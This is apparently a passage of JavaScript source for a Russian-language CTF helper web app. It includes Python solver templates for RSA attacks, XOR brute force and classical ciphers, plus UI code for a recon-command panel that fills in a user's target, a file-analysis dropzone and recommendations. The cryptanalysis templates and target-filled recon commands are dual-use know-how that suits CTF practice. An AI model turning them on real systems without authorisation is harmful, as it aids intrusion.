# ─── Given values ────────────────────────────────────────────
n = 0   # TODO
e = 65537
c = 0   # TODO

# ─── Attack 1: Small e (e=3) + small message ─────────────────
# from sympy import integer_nthroot
# m, exact = integer_nthroot(c, e)
# if exact: print(long_to_bytes(m))

# ─── Attack 2: Factor n (try factordb.com first) ─────────────
# p = 0  # TODO
# q = n // p
# assert p * q == n
# phi = (p - 1) * (q - 1)
# d   = inverse(e, phi)
# m   = pow(c, d, n)
# print(long_to_bytes(m))

# ─── Attack 3: Common modulus (same n, different e) ──────────
# n, e1, c1, e2, c2 = ...
# g, s, t = extended_gcd(e1, e2)  # g should be 1
# m = (pow(c1, s, n) * pow(c2, t, n)) % n
# print(long_to_bytes(m))

# ─── Attack 4: Wiener (small d) ──────────────────────────────
# pip install owiener
# import owiener
# d = owiener.attack(e, n)
# if d: print(long_to_bytes(pow(c, d, n)))`,

  crypto_xor:`import sys

with open('encrypted.bin', 'rb') as f:
    data = f.read()

# ─── Single-byte XOR brute force ─────────────────────────────
print("=== Single-byte XOR ===")
best_score, best_key, best_dec = 0, 0, b''
for key in range(256):
    dec = bytes(b ^ key for b in data)
    score = sum(c in b' etaoinshrdlucmfywgpbvkxjqzETAOINSHRDL_{}' for c in dec)
    if score > best_score:
        best_score, best_key, best_dec = score, key, dec
print(f'Key: 0x{best_key:02x} ({best_key})')
print(best_dec[:200])

# ─── Multi-byte XOR (known key length) ───────────────────────
# key = b'SECRET'  # TODO
# dec = bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))
# print(dec)

# ─── XOR with known plaintext (known-plaintext attack) ───────
# known_plain = b'flag{'   # known prefix
# key_bytes   = bytes(data[i] ^ known_plain[i] for i in range(len(known_plain)))
# print('Key prefix:', key_bytes)`,

  crypto_classical:`import string
from collections import Counter

text = open('cipher.txt').read().strip()

# ─── Caesar / ROT brute force ────────────────────────────────
print("=== Caesar brute force ===")
for shift in range(26):
    dec = ''.join(
        chr((ord(c) - 65 + shift) % 26 + 65) if c.isupper() else
        chr((ord(c) - 97 + shift) % 26 + 97) if c.islower() else c
        for c in text
    )
    score = sum(1 for c in dec.lower() if c in 'etaoinshrdlu')
    print(f'  ROT{shift:2d}: {dec[:60]}  (score={score})')

# ─── Frequency analysis (substitution cipher) ────────────────
# freq = Counter(c for c in text.upper() if c.isalpha())
# print("Freq:", freq.most_common(10))
# En: E T A O I N S H R D L C U M F W G Y P B V K X J Q Z
# Map most frequent ciphertext letter → E, second → T, etc.

# ─── Vigenère — index of coincidence ─────────────────────────
# pip install pycipher
# from pycipher import Vigenere
# Vigenere('KEY').decipher(text)`,
};

function templateAccordion(catId) {
  if (catId!=="pwn"&&catId!=="crypto") return "";
  const tabs = catId==="pwn"
    ? [{id:"ret2win",label:"ret2win"},{id:"ret2libc",label:"ret2libc"},{id:"fmt",label:"Format String"}]
    : [{id:"rsa",label:"RSA"},{id:"xor",label:"XOR"},{id:"classical",label:"Caesar/Vigenère"}];
  const tabsHTML = tabs.map((t,i)=>`<button class="tpl-tab ${i===0?"active":""}" data-tpl="${t.id}">${t.label}</button>`).join("");
  const first = TEMPLATES[`${catId}_${tabs[0].id}`]||"";
  return `
    <details class="analysis-panel" id="tpl-panel-${catId}" style="margin-bottom:32px">
      <summary class="analysis-summary">
        <svg class="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
        Шаблоны скриптов
        <svg class="analysis-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg>
        <span class="analysis-badge">python</span>
      </summary>
      <div class="analysis-body">
        <div class="tpl-tabs">${tabsHTML}</div>
        <div class="code" style="margin-top:0;border-top-left-radius:0;border-top-right-radius:0">
          <div class="code-bar">
            <span class="label">python3</span>
            <button class="copy-btn" id="tpl-copy-${catId}" type="button">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
              <span>Копировать</span>
            </button>
          </div>
          <pre id="tpl-code-${catId}"><code>${escapeHtml(first)}</code></pre>
        </div>
      </div>
    </details>`;
}

function wireTemplates(catId) {
  if (catId!=="pwn"&&catId!=="crypto") return;
  const panel=document.getElementById(`tpl-panel-${catId}`);
  if (!panel) return;
  panel.querySelectorAll(".tpl-tab").forEach(btn=>{
    btn.addEventListener("click",()=>{
      panel.querySelectorAll(".tpl-tab").forEach(b=>b.classList.remove("active"));
      btn.classList.add("active");
      const tpl=TEMPLATES[`${catId}_${btn.dataset.tpl}`]||"";
      document.getElementById(`tpl-code-${catId}`).innerHTML=`<code>${escapeHtml(tpl)}</code>`;
    });
  });
  const copyBtn=document.getElementById(`tpl-copy-${catId}`);
  if (copyBtn) copyBtn.addEventListener("click",()=>{
    const code=document.getElementById(`tpl-code-${catId}`).textContent;
    copyText(code,copyBtn);
  });
}

/* ============================================================
   Quick Scan panel (Web category)
   ============================================================ */
function quickScanPanel(catId) {
  if (catId !== "web") return "";
  const t   = state.target.trim();
  const { url, host } = parseTarget(t);

  const targetBar = t
    ? `<div class="qs-target-active">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="3"/></svg>
        <span class="qs-target-val">${escapeHtml(url)}</span>
        <span class="qs-target-hint">— команды заполнены целью</span>
       </div>`
    : `<div class="qs-no-target">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="3"/><line x1="12" y1="2" x2="12" y2="5"/><line x1="12" y1="19" x2="12" y2="22"/><line x1="2" y1="12" x2="5" y2="12"/><line x1="19" y1="12" x2="22" y2="12"/></svg>
        Укажите цель в поле сайдбара — команды заполнятся автоматически
       </div>`;

  const cards = RECON_CMDS.map(r => {
    const cmd = applyTarget(r.cmd);
    return `
      <div class="qs-card">
        <div class="qs-card-head">
          <span class="qs-tool">${escapeHtml(r.tool)}</span>
          <span class="qs-desc">${escapeHtml(r.desc)}</span>
        </div>
        <div class="code" style="margin:0;border-radius:0 0 var(--radius-sm) var(--radius-sm)">
          <div class="code-bar" style="border-top:none">
            <span class="label">shell</span>
            <button class="copy-btn qs-copy" type="button" data-cmd="${escapeHtml(cmd)}">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
              <span>Копировать</span>
            </button>
          </div>
          <pre><code class="${t ? "qs-filled" : ""}">${escapeHtml(cmd)}</code></pre>
        </div>
      </div>`;
  }).join("");

  return `
    <details class="analysis-panel" id="qs-panel" open>
      <summary class="analysis-summary">
        <svg class="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="3"/><line x1="12" y1="2" x2="12" y2="5"/><line x1="12" y1="19" x2="12" y2="22"/><line x1="2" y1="12" x2="5" y2="12"/><line x1="19" y1="12" x2="22" y2="12"/></svg>
        Быстрый реконнект
        <svg class="analysis-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg>
        <span class="analysis-badge">${t ? escapeHtml(host) : "цель не задана"}</span>
      </summary>
      <div class="analysis-body">
        ${targetBar}
        <div class="qs-grid">${cards}</div>
      </div>
    </details>`;
}

function wireQuickScan() {
  document.querySelectorAll(".qs-copy").forEach(btn =>
    btn.addEventListener("click", () => copyText(btn.dataset.cmd, btn))
  );
}

/* ============================================================
   File Analysis Panel
   ============================================================ */
function analysisPanel(catId) {
  return `
    <details class="analysis-panel" id="ap-${catId}">
      <summary class="analysis-summary">
        <svg class="ico" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
        Анализировать файл
        <svg class="analysis-chevron" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg>
        <span class="analysis-badge">client-side</span>
      </summary>
      <div class="analysis-body">
        <div class="dropzone" id="dz-${catId}">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
          <span class="dropzone-label">Перетащите файл сюда или нажмите для выбора</span>
          <span class="dropzone-sub">бинарник, изображение, архив, текст — любой файл</span>
          <input type="file" id="fi-${catId}" style="display:none">
        </div>
        <div class="analysis-results hidden" id="ar-${catId}"></div>
      </div>
    </details>`;
}

function wireAnalysisPanel(catId) {
  const dz  = document.getElementById(`dz-${catId}`);
  const fi  = document.getElementById(`fi-${catId}`);
  const ar  = document.getElementById(`ar-${catId}`);
  if (!dz || !fi) return;

  dz.addEventListener("click", e => { if (e.target === dz || e.target.classList.contains("dropzone-label") || e.target.classList.contains("dropzone-sub") || e.target.tagName === "svg" || e.target.tagName === "polyline" || e.target.tagName === "line" || e.target.tagName === "path") fi.click(); });
  fi.addEventListener("change", e => { if (e.target.files[0]) runAnalysis(e.target.files[0], catId, ar, dz); });
  dz.addEventListener("dragover",  e => { e.preventDefault(); dz.classList.add("drag-over"); });
  dz.addEventListener("dragleave", ()  => dz.classList.remove("drag-over"));
  dz.addEventListener("drop", e => {
    e.preventDefault(); dz.classList.remove("drag-over");
    if (e.dataTransfer.files[0]) runAnalysis(e.dataTransfer.files[0], catId, ar, dz);
  });
}

function runAnalysis(file, catId, ar, dz) {
  dz.innerHTML = `<span class="dropzone-label">Анализирую ${escapeHtml(file.name)}…</span>`;
  const reader = new FileReader();
  reader.onload = e => {
    const results = Analyzer.analyze(catId, file.name, e.target.result);
    const recs    = Analyzer.recommend(catId, results);
    ar.innerHTML  = buildResultsHTML(results) + buildRecsHTML(recs);
    ar.classList.remove("hidden");
    ar.querySelectorAll(".rec-cmd-copy").forEach(btn =>
      btn.addEventListener("click", () => {
        copyText(btn.dataset.cmd, btn);
        btn.textContent = "✓";
        setTimeout(() => btn.textContent = "copy", 1500);
      })
    );

    const hasFlag = results.some(r => r.findings?.some(f => f.isFlag));
    if (hasFlag) toast("Возможный флаг найден — см. выделенные результаты");

    dz.innerHTML = `
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
      <span class="dropzone-label">${escapeHtml(file.name)}</span>
      <span class="dropzone-sub">нажмите или перетащите другой файл</span>
      <input type="file" id="fi-${catId}" style="display:none">`;
    const fi2 = dz.querySelector("input[type=file]");
    fi2.addEventListener("change", ev => { if (ev.target.files[0]) runAnalysis(ev.target.files[0], catId, ar, dz); });
  };
  reader.readAsArrayBuffer(file);
}

function buildRecsHTML(recs) {
  if (!recs || !recs.length) return "";
  const priorityLabel = { critical: "!", high: "", medium: "", low: "" };
  const items = recs.map((rec, i) => {
    const num = rec.priority === "critical" ? "!" : String(i + (recs[0]?.priority === "critical" ? 0 : 1));
    const stepsHTML = rec.steps.map(s =>
      `<li>${escapeHtml(s)}</li>`
    ).join("");
    const cmdsHTML = rec.commands.length
      ? `<div class="rec-cmds">${rec.commands.map(cmd =>
          `<div class="rec-cmd-row">
            <code class="rec-cmd-code">${escapeHtml(cmd)}</code>
            <button class="rec-cmd-copy" data-cmd="${escapeHtml(cmd)}" title="Скопировать">copy</button>
          </div>`).join("")}</div>` : "";
    return `
      <div class="rec-item priority-${rec.priority}">
        <div class="rec-num">${num}</div>
        <div class="rec-body">
          <div class="rec-title">${escapeHtml(rec.title)}</div>
          <ul class="rec-steps">${stepsHTML}</ul>
          ${cmdsHTML}
        </div>
      </div>`;
  }).join("");

  return `
    <div class="rec-panel">
      <div class="rec-panel-head">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
        Что делать дальше
        <span class="rec-panel-sub">${recs.length} ${plural(recs.length,"рекомендация","рекомендации","рекомендаций")}</span>
      </div>
      <div class="rec-list">${items}</div>
    </div>`;
}

function buildResultsHTML(results) {
  return results.map(r => {
    const hasF = r.findings?.length > 0;
    const findingsHTML = hasF ? `
      <div class="tool-findings">
        <div class="tool-findings-title">На что обратить внимание</div>
        ${r.findings.map(f => `
          <div class="tool-finding${f.isFlag?" is-flag":""}">
            <span class="tool-finding-token">${escapeHtml(f.token)}</span>
            <span class="tool-finding-desc">${escapeHtml(f.desc)}</span>
          </div>`).join("")}
      </div>` : "";
    const cmdLines = r.cmd.split("\n").map(l => escapeHtml(l)).join("\n");
    return `
      <div class="tool-result${r.highlight?" has-findings":""}">
        <div class="tool-result-head">
          <span class="tool-result-name">${escapeHtml(r.tool)}</span>
          <code class="tool-result-cmd">$ ${cmdLines}</code>
        </div>
        <div class="tool-result-body"><pre>${escapeHtml(r.output||"")}</pre></div>
        ${findingsHTML}
      </div>`;
  }).join("");
}

/* ============================================================
   Tool info popover
   ============================================================ */
let activeProgChip = null;

function showToolPopover(btn, prog) {
  activeProgChip = btn;
  btn.classList.add("active");
  $("#tool-popover-name").textContent = prog.name;
  $("#tool-popover-desc").textContent = prog.desc;
  const link = $("#tool-popover-link");
  link.href = prog.url;

  toolPopover.classList.remove("hidden");

  const rect = btn.getBoundingClientRect();
  const pw = toolPopover.offsetWidth || 272;
  const ph = toolPopover.offsetHeight || 120;
  const vw = window.innerWidth, vh = window.innerHeight;

  let top = rect.bottom + 8;
  let left = rect.left;

  if (left + pw > vw - 12) left = vw - pw - 12;
  if (left < 12) left = 12;
  if (top + ph > vh - 12) top = rect.top - ph - 8;

  toolPopover.style.top = top + "px";
  toolPopover.style.left = left + "px";
}

function hideToolPopover() {
  toolPopover.classList.add("hidden");
  if (activeProgChip) { activeProgChip.classList.remove("active"); activeProgChip = null; }
}

function wireProgChips(cat) {
  content.querySelectorAll(".chip-tool").forEach(btn => {
    btn.addEventListener("click", e => {
      e.stopPropagation();
      const prog = cat.programs[+btn.dataset.progIdx];
      if (!prog || typeof prog === "string") return;
      if (activeProgChip === btn) { hideToolPopover(); return; }
      showToolPopover(btn, prog);
    });
  });
}

/* ============================================================
   Init
   ============================================================ */
function init() {
  setTheme(localStorage.getItem("ctf-theme") || "dark");

  // Target input
  const targetEl    = document.getElementById("target-input");
  const targetClear = document.getElementById("target-clear");
  const saved = localStorage.getItem(TARGET_KEY) || "";
  if (saved) { targetEl.value = saved; setTarget(saved); }

  targetEl.addEventListener("input", e => {
    setTarget(e.target.value);
    render();
  });
  targetEl.addEventListener("keydown", e => {
    if (e.key === "Escape") { targetEl.blur(); }
    if (e.key === "Enter")  { targetEl.blur(); openCategory("web"); }
  });
  targetClear.addEventListener("click", () => {
    targetEl.value = "";
    setTarget("");
    render();
    targetEl.focus();
  });
  document.querySelectorAll(".theme-toggle button").forEach(b =>
    b.addEventListener("click", () => setTheme(b.dataset.theme)));

  searchEl.addEventListener("input", e => {
    state.query = e.target.value;
    clearEl.style.display = state.query ? "flex" : "none";
    if (state.query.trim()) { state.view = "search"; }
    else { state.view = state.category ? "category" : "home"; }
    render();
  });
  clearEl.addEventListener("click", () => {
    searchEl.value = ""; state.query = ""; clearEl.style.display = "none";
    state.view = state.category ? "category" : "home";
    render(); searchEl.focus();
  });

  document.addEventListener("keydown", e => {
    if (e.key === "/" && document.activeElement !== searchEl) { e.preventDefault(); searchEl.focus(); searchEl.select(); }
    if (e.key === "Escape" && document.activeElement === searchEl) searchEl.blur();
    if (e.key === "Escape") hideToolPopover();
  });

  document.addEventListener("click", e => {
    if (!toolPopover.classList.contains("hidden") && !toolPopover.contains(e.target)) {
      hideToolPopover();
    }
  });

  $("#menu-btn").addEventListener("click", openSidebar);
  $("#scrim").addEventListener("click", closeSidebar);
  $("#brand").addEventListener("click", goHome);

  // modal
  $("#modal-close").addEventListener("click", closeModal);
  $("#modal-cancel").addEventListener("click", closeModal);
  $("#modal-save").addEventListener("click", saveCustomCommand);
  $("#btn-add-explain").addEventListener("click", () => addExplainRow());
  modalOverlay.addEventListener("click", e => { if (e.target === modalOverlay) closeModal(); });
  document.addEventListener("keydown", e => { if (e.key === "Escape" && !modalOverlay.classList.contains("hidden")) closeModal(); });

  injectCustomCmds();

  window.addEventListener("scroll", () => requestAnimationFrame(syncTOC), { passive: true });
  document.querySelector(".content")?.addEventListener("scroll", () => requestAnimationFrame(syncTOC), { passive: true });

  render();
}

document.addEventListener("DOMContentLoaded", init);
